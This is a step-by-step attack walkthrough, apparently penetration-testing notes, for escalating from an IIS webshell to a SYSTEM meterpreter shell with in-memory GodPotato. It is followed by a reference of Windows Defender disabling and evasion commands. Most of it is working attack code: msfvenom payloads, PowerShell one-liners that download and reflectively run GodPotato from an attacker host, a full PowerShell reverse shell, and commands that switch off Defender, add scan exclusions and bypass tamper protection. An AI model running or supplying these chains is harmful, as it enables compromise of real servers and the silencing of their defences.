

# GodPotato In-Memory Privilege Escalation — Full Attack Chain

> Step-by-step walkthrough: webshell → SYSTEM meterpreter via in-memory GodPotato + Defender bypass.

---
## Scenario Summary

```
Initial access:  Webshell on IIS server (C:\inetpub\wwwroot)
Shell user:      NT AUTHORITY\NETWORK SERVICE
Key privilege:   SeImpersonatePrivilege
Obstacle:        Windows Defender real-time protection active
Target:          NT AUTHORITY\SYSTEM meterpreter shell
Attacker IP:     192.168.45.160
```

---
## Step 1: Confirm SeImpersonatePrivilege

From your webshell or initial shell:
```cmd
whoami /priv
```
## Look for `SeImpersonatePrivilege: Enabled`. This is what GodPotato exploits.

## Step 2: Generate Meterpreter Payload on Kali

```bash
# Generate meterpreter exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.160 LPORT=443 -f exe -o met.exe

# If AV catches raw msfvenom, compile your own with mcs:
# Step A: Generate shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.160 LPORT=443 -f csharp
# Step B: Paste into C# loader, compile:
mcs -platform:x64 -target:exe -out:met.exe loader.cs
```
---
## Step 3: Host Files on Kali

```bash
# Put GodPotato-NET4.exe and met.exe in the same directory
python3 -m http.server 80
```
---
## Step 4: Start Meterpreter Handler
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.160; set LPORT 443; run"
```

---
## Step 5: Load GodPotato In-Memory and Verify SYSTEM

Test that GodPotato works — run `whoami` as SYSTEM and write output to file:

```powershell
powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.45.160/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','whoami'))) | Out-File C:\Windows\Tasks\out.txt"
```

Verify:
```cmd
type C:\Windows\Tasks\out.txt
```
Should show `nt authority\system`.
**Key points:**
- `DownloadData` loads the exe bytes into memory — never touches disk
- `Assembly.Load` loads it as a .NET assembly in the current process
- `EntryPoint.Invoke` calls its Main method with the arguments
- `@(,[string[]]@(...))` casts args as string array (required)
- GodPotato is C#/.NET so `Assembly.Load` works (PrintSpoofer is C++ so it can't do this)

---
## Step 6: Disable Defender as SYSTEM

GodPotato runs commands as SYSTEM, and SYSTEM can disable Defender:

```powershell
powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.45.160/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -nop -ep bypass Set-MpPreference -DisableRealtimeMonitoring $true')))"
```

## Wait a few seconds for the policy to apply.

## Step 7: Download and Execute Meterpreter as SYSTEM

Now that Defender is off, download met.exe and run it as SYSTEM:
```powershell
powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.45.160/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); (New-Object Net.WebClient).DownloadFile('http://192.168.45.160/met.exe','C:\Windows\Tasks\met.exe'); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','C:\Windows\Tasks\met.exe')))"
```
## Your meterpreter handler catches a SYSTEM shell.

## Step 8: Verify

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
```
---
## Why Each Step Was Necessary

```
Problem 1: We're NETWORK SERVICE, not SYSTEM
Solution:  GodPotato exploits SeImpersonatePrivilege → SYSTEM

Problem 2: Can't upload binaries through webshell easily
Solution:  Load GodPotato in memory via Assembly.Load — no file on disk

Problem 3: Defender catches met.exe on disk (Win32Error:225 = virus detected)
Solution:  Use SYSTEM access to disable Defender first, then download met.exe

Problem 4: Need to do everything through a crappy webshell
Solution:  Chain everything into single PowerShell one-liners
```

---
## Alternative: Fully In-Memory (No File on Disk at All)

If you don't want met.exe touching disk, use a PowerShell reverse shell instead:

```bash
# On Kali — generate base64 encoded PowerShell reverse shell
echo -n '$c=New-Object Net.Sockets.TCPClient("192.168.45.160",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+"PS> ");$s.Write($sb,0,$sb.Length)};$c.Close()' | iconv -t UTF-16LE | base64 -w 0
```

```powershell
powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.45.160/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -e BASE64_ENCODED_SHELL')))"
```

Catch with `nc -lvnp 443`. Shell comes back as SYSTEM. Nothing ever written to disk.
## This gives you a basic PS shell as SYSTEM. Then disable Defender from that shell and upgrade to meterpreter if needed.

# Windows Defender Command Reference

> All commands require SYSTEM or local admin. Use GodPotato to execute as SYSTEM if needed.

---
## Check Defender Status

```powershell
# Full status
Get-MpComputerStatus

# Quick checks
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, BehaviorMonitorEnabled, AntispywareEnabled

# Is Defender service running?
sc query WinDefend
Get-Service WinDefend

# Check definitions age
Get-MpComputerStatus | Select-Object AntivirusSignatureLastUpdated, AntispywareSignatureLastUpdated

# From cmd
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -GetFiles
```

---
## Disable Defender (Requires SYSTEM/Admin)

```powershell
# Disable real-time protection (most important)
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable everything
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIntrusionPreventionSystem $true

# All in one line (for webshell one-liners)
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableScriptScanning $true"

# Stop the service entirely
sc stop WinDefend
# May not work on newer Windows — use Set-MpPreference instead

# Uninstall Defender (Server editions)
Uninstall-WindowsFeature -Name Windows-Defender
# Or:
dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet

# Kill the process (aggressive)
taskkill /IM MsMpEng.exe /F
# Usually fails — MsMpEng is protected
```

---

## Exclusion Paths (Stealthier Than Disabling)

```powershell
# Add exclusion for a directory — anything in it won't be scanned
Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionPath "C:\Users\Public"

# Add exclusion for a file extension
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionExtension ".dll"

# Add exclusion for a process — anything it spawns won't be scanned
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionProcess "cmd.exe"
Add-MpPreference -ExclusionProcess "met.exe"

# View current exclusions
Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess

# Remove exclusions (cleanup)
Remove-MpPreference -ExclusionPath "C:\Windows\Tasks"
```

---

## Tamper Protection

```powershell
# Check if tamper protection is enabled
Get-MpComputerStatus | Select-Object IsTamperProtected

# If tamper protection is ON:
# - Set-MpPreference commands will FAIL
# - You cannot disable Defender programmatically
# - It can only be disabled through Windows Security GUI or Intune
# - BUT — you can still add exclusion paths in some cases

# Workaround: modify Defender via registry (sometimes works even with tamper protection)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
# Requires reboot or service restart to take effect

# GPO-based disable (if you have GPO access)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

---

## Submission / Scan Control

```powershell
# Disable cloud-delivered protection (stops cloud lookups)
Set-MpPreference -MAPSReporting Disabled

# Disable automatic sample submission
Set-MpPreference -SubmitSamplesConsent NeverSend

# Disable cloud block level
Set-MpPreference -CloudBlockLevel Disabled
```

---

## Defender Log Locations

```powershell
# Check what Defender caught
Get-MpThreatDetection
Get-MpThreat

# Defender logs
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | Select-Object -First 20

# Detection history
dir "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory"

# Quarantine
dir "C:\ProgramData\Microsoft\Windows Defender\Quarantine"
```

---

## Defender via GodPotato One-Liners

> For when you're stuck in a webshell and need to do everything through GodPotato.

```powershell
# Disable real-time protection
powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -nop -ep bypass Set-MpPreference -DisableRealtimeMonitoring $true')))"

# Add exclusion path
powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -nop -ep bypass Add-MpPreference -ExclusionPath C:\Windows\Tasks')))"

# Disable everything
powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -nop -ep bypass Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true')))"

# Check Defender status (write to file)
powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -nop -ep bypass Get-MpComputerStatus | Out-File C:\Windows\Tasks\defender.txt')))"
```

---

## Quick Decision Tree

```
Need to get past Defender?
│
├── Are you SYSTEM/Admin?
│   ├── YES
│   │   ├── Tamper protection OFF? → Set-MpPreference -DisableRealtimeMonitoring $true
│   │   ├── Tamper protection ON?  → Add exclusion path or use registry method
│   │   └── Then download and execute payload freely
│   │
│   └── NO (SeImpersonatePrivilege?)
│       ├── YES → GodPotato in-memory → disable Defender as SYSTEM → payload
│       └── NO  → AV evasion: in-memory execution, custom compiled payloads, LOLBins
│
├── Can't disable Defender at all?
│   ├── Add exclusion: Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
│   ├── In-memory only: Assembly.Load, IEX, no file on disk
│   ├── Custom compile: mcs on Kali, unique hash per build
│   └── PowerShell reverse shell: no exe needed, encode with -enc
│
└── Payload keeps getting caught even with Defender off?
    ├── AMSI still active → bypass AMSI separately
    ├── AppLocker blocking → bypass paths or LOLBins
    └── EDR (not Defender) → different product, different bypass
```